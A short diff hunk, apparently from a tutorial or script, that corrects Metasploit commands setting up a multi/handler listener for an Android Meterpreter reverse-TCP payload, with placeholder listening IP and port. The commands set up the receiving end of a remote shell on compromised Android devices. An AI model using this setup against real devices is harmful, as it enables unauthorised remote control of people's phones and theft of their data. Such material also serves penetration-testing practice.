@@ -16,8 +16,8 @@ use exploit/multi/handler
 set payload android/meterpreter/reverse_tcp
 
 # Set localhost IP to receive and port to listen connections
-set LHOST=<Receive_IP>
-LPORT=<Receive_Port>
+set LHOST=<localhost_ip_receive>
+set LPORT=<localhost_port_listen>
 
 # Start the listener
 run / exploit
